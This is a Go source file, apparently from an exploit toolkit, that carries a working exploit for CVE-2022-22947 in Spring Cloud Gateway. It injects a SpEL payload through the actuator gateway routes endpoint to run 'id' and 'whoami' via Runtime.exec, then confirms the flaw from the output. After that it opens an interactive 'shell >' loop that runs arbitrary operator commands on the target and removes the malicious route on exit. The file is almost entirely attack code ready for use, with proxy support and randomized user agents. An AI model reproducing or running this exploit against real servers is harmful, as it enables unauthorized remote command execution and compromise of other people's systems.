package exppackage

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"os"
	"ssp/common"
	"strings"
)

func CVE_2022_22947(url string, proxyURL string) {

	// 定义API的端点
	endpoint1 := "actuator/gateway/routes/hacktest"
	endpoint2 := "actuator/gateway/refresh"

	// 设置请求头
	oldHeader1 := map[string]string{
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "*/*",
		"Accept-Language": "en",
		"User-Agent":      common.GetRandomUserAgent(),
		"Content-Type":    "application/json",
	}

	oldHeader2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	// 合并请求头
	headers1 := common.MergeHeaders(oldHeader1)
	headers2 := common.MergeHeaders(oldHeader2)

	// 设置payload
	payload := `{
              "id": "hacktest",
              "filters": [{
                "name": "AddResponseHeader",
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
                }],
              "uri": "http://example.com",
              "order": 0
            }`

	payload2 := `{
              "id": "hacktest",
              "filters": [{
                "name": "AddResponseHeader",
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"}
                }],
              "uri": "http://example.com",
              "order": 0
            }`

	// 使用 MakeRequest 发送 POST 请求
	urltest := url + endpoint1
	resp1, body, err := common.MakeRequest(urltest, "POST", proxyURL, headers1, payload)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	defer resp1.Body.Close()
	// 打印响应体内容
	fmt.Println("响应内容:", string(body))

	// 刷新API
	refreshURL := url + endpoint2
	_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
	if err != nil {
		color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
		return
	}

	// 获取路由数据
	routesURL := url + endpoint1
	resp3, body, err := common.MakeRequest(routesURL, "GET", proxyURL, headers2, "")
	if err != nil {
		color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
		return
	}
	defer resp3.Body.Close()

	// 打印路由响应体内容
	fmt.Println("路由响应内容:", string(body))

	// 判断是否存在漏洞回显
	if strings.Contains(string(body), "uid=") && strings.Contains(string(body), "gid=") && strings.Contains(string(body), "groups=") {
		// 输出漏洞确认
		common.PrintVulnerabilityConfirmation("CVE-2022-22947", url, "Null", "3")
		color.Red("[+] Payload回显如下：")
		res := common.ExtractResult(string(body), `s*'([^']*)'`)
		result := strings.Replace(res, "\\n", "\n", -1)
		fmt.Println(result)

		// 开始交互式命令执行
		for {
			var Cmd string
			reader := bufio.NewReader(os.Stdin)

			// 提示用户输入命令
			fmt.Print("shell > ")
			Cmd, _ = reader.ReadString('\n')
			Cmd = strings.TrimSpace(Cmd)

			// 如果输入exit，则退出
			if Cmd == "exit" {
				// 删除恶意路由
				_, _, err := common.MakeRequest(urltest, "DELETE", proxyURL, headers2, "")
				if err != nil {
					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
					return
				}

				// 发送刷新请求
				_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
				if err != nil {
					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
					return
				}
				os.Exit(0)
			} else {
				// 执行用户输入的命令
				payload3 := strings.ReplaceAll(payload2, "whoami", Cmd)
				_, _, err := common.MakeRequest(urltest, "POST", proxyURL, headers1, payload3)
				if err != nil {
					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
					return
				}

				// 发送刷新请求
				_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
				if err != nil {
					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
					return
				}

				// 获取路由数据
				resp3, body, err := common.MakeRequest(routesURL, "GET", proxyURL, headers2, "")
				if err != nil {
					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
					return
				}
				defer resp3.Body.Close()

				// 打印命令执行结果
				res := common.ExtractResult(string(body), `s*'([^']*)'`)
				result := strings.Replace(res, "\\n", "\n", -1)
				fmt.Println(result)
			}
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22947远程命令执行漏洞\n", url)
	}
}
